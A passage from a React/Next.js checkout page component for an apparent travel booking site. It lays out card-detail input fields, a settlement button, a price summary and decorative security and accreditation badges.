                                 <label className="text-[11px] font-black text-white/20 uppercase tracking-[0.3em] ml-2 italic">Universal Asset Settlement Number</label>
                                 <input type="text" name="number" value={cardDetails.number} onChange={(e) => setCardDetails({...cardDetails, number: e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-3xl px-8 py-6 text-base font-black text-white focus:ring-2 focus:ring-brand-secondary shadow-inner outline-none transition-all placeholder:text-white/10 italic" placeholder="0000 0000 0000 0000" />
                              </div>
                              <div className="grid grid-cols-2 gap-8">
                                 <div className="space-y-4">
                                    <label className="text-[11px] font-black text-white/20 uppercase tracking-[0.3em] ml-2 italic">Hub Expiry</label>
                                    <input type="text" name="expiry" value={cardDetails.expiry} onChange={(e) => setCardDetails({...cardDetails, expiry: e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-3xl px-8 py-6 text-base font-black text-white focus:ring-2 focus:ring-brand-secondary shadow-inner outline-none transition-all placeholder:text-white/10 italic" placeholder="MM/YY" />
                                 </div>
                                 <div className="space-y-4">
                                    <label className="text-[11px] font-black text-white/20 uppercase tracking-[0.3em] ml-2 italic">Shield Auth (CVV)</label>
                                    <input type="text" name="cvc" value={cardDetails.cvc} onChange={(e) => setCardDetails({...cardDetails, cvc: e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-3xl px-8 py-6 text-base font-black text-white focus:ring-2 focus:ring-brand-secondary shadow-inner outline-none transition-all placeholder:text-white/10 italic" placeholder="000" />
                                 </div>
                              </div>
                              <div className="space-y-4">
                                 <label className="text-[11px] font-black text-white/20 uppercase tracking-[0.3em] ml-2 italic">Administrative Hub Postal</label>
                                 <input type="text" name="postalCode" value={cardDetails.postalCode} onChange={(e) => setCardDetails({...cardDetails, postalCode: e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-3xl px-8 py-6 text-base font-black text-white focus:ring-2 focus:ring-brand-secondary shadow-inner outline-none transition-all placeholder:text-white/10 italic" placeholder="HQ ZIP CODE" />
                              </div>
                            </div>
                        </div>

                        <div className="pt-20 border-t border-white/5">
                           <button type="submit" disabled={loading} className={`w-full py-10 rounded-[3rem] text-white font-black uppercase tracking-[0.4em] text-xl shadow-[0_50px_100px_rgba(0,0,0,0.6)] transition-all transform hover:scale-[1.02] active:scale-95 flex items-center justify-center gap-6 italic ${paymentType === 'full' ? 'bg-emerald-600 hover:bg-emerald-500 shadow-emerald-500/30' : 'bg-orange-600 hover:bg-orange-500 shadow-orange-500/30'}`}>
                              {loading ? <span className="w-10 h-10 border-8 border-white/30 border-t-white rounded-full animate-spin"></span> : <>🔒 {paymentType === 'full' ? 'EXECUTE FULL ASSET SETTLEMENT' : 'AUTHORIZE ESCROW LOCK'}</>}
                           </button>
                           <p className="text-center text-[10px] font-black text-white/10 uppercase tracking-[0.5em] mt-10 italic leading-none">NEURAL SHIELD 4.0 ACTIVE · GDS IRIS SECURE</p>
                        </div>
                      </form>
                  </div>

                  <div className="space-y-16">
                      <div className="bg-slate-900 rounded-[5rem] p-16 text-white shadow-[0_60px_150px_rgba(0,0,0,0.7)] space-y-12 relative overflow-hidden backdrop-blur-3xl border border-white/5">
                        <div className="absolute top-0 right-0 w-80 h-80 bg-brand-primary/10 blur-[150px] rounded-full pointer-events-none"></div>
                        <div className="flex items-center justify-between border-b border-white/10 pb-10 relative z-10">
                           <div className="flex items-center gap-6">
                              <span className="w-12 h-12 rounded-2xl bg-white/5 flex items-center justify-center text-2xl border border-white/5 italic font-black">S</span>
                              <h3 className="text-2xl font-black uppercase italic tracking-tighter leading-none italic">Secure Hub Settlement</h3>
                           </div>
                           <div className="flex gap-3">
                              {['VISA', 'MC', 'AMX'].map(c => <span key={c} className="text-[10px] font-black bg-white/5 px-3 py-1.5 rounded-xl border border-white/10 text-white/20 italic tracking-widest">{c}</span>)}
                           </div>
                        </div>

                        <div className="space-y-10 relative z-10">
                           <div className="bg-white/5 border border-white/10 rounded-[3rem] p-10 text-center space-y-6 shadow-inner relative overflow-hidden group">
                              <div className="absolute inset-0 bg-brand-secondary/5 blur-3xl opacity-0 group-hover:opacity-100 transition-opacity duration-1000"></div>
                              <p className="text-xl font-bold text-slate-300 relative z-10 leading-relaxed italic">Your transaction for <span className="text-brand-secondary font-black text-4xl tracking-tighter block mt-4 mb-2 italic shadow-brand-secondary/20">{paymentType === 'full' ? formatPricing(totalCurrentPrice, activeCurrency) : formatPricing(10 + (seatReserve ? 20 : 0), activeCurrency)}</span> will be executed via the encrypted IRIS GDS gateway.</p>
                              <div className="flex items-center justify-center gap-4 text-emerald-400 font-black text-[11px] uppercase tracking-[0.4em] relative z-10 italic">
                                 <span className="w-3 h-3 rounded-full bg-emerald-500 animate-pulse shadow-[0_0_15px_#10b981]"></span>
                                 Universal Uplink SECURED
                              </div>
                           </div>
                        </div>

                        <div className="pt-12 relative z-10 border-t border-white/10">
                           <div className="p-10 bg-emerald-500/10 border border-emerald-500/20 rounded-[3rem] text-center shadow-2xl relative overflow-hidden group">
                              <div className="absolute inset-0 bg-emerald-500/5 animate-pulse"></div>
                              <p className="text-lg font-black text-emerald-400 uppercase tracking-[0.4em] italic leading-none mb-4 relative z-10">Neural Shield Identity: ENCRYPTED</p>
                              <p className="text-[10px] font-black text-emerald-400/20 uppercase tracking-[0.3em] mt-1 relative z-10 leading-none">Universal GDS Protocol · Delaware Legal Ops</p>
                           </div>
                        </div>
                      </div>

                      <div className="bg-white/5 rounded-[5rem] p-16 border border-white/10 shadow-[0_50px_100px_rgba(0,0,0,0.5)] backdrop-blur-3xl group">
                         <h4 className="text-[12px] font-black text-white/20 uppercase tracking-[0.5em] mb-12 border-b border-white/5 pb-8 italic">Assurance Hub Protocols</h4>
                         <div className="space-y-10">
                            {[t('bbb_rated'), t('pnr_promise'), t('arc_accredited')].map((l, i) => (
                               <div key={l} className="flex items-center gap-6 text-[11px] font-black text-white/60 uppercase tracking-widest leading-none group cursor-default italic">
                                  <span className={`w-12 h-12 rounded-[1.5rem] bg-white/5 text-emerald-500 flex items-center justify-center border border-white/10 shadow-2xl italic font-black transition-all duration-700 ${i === 0 ? 'group-hover:bg-emerald-500 group-hover:text-white group-hover:shadow-[0_0_30px_#10b981]' : i === 1 ? 'group-hover:bg-brand-secondary group-hover:text-slate-900 group-hover:shadow-[0_0_30px_#facc15]' : 'group-hover:bg-brand-primary group-hover:text-white group-hover:shadow-[0_0_30px_#eb3b5a]'}`}>✓</span>
                                  {l}
                               </div>
                            ))}
                         </div>
                      </div>
                  </div>
               </div>
            </div>
         </main>
      </div>
   );
}

export default function CheckoutPage() {
   return (
      <Suspense fallback={<div className="min-h-screen flex items-center justify-center bg-slate-950 text-brand-secondary animate-pulse font-black uppercase tracking-[0.5em] italic">Initializing Secure GDS Node...</div>}>
         <CheckoutContent />
      </Suspense>
   );
}
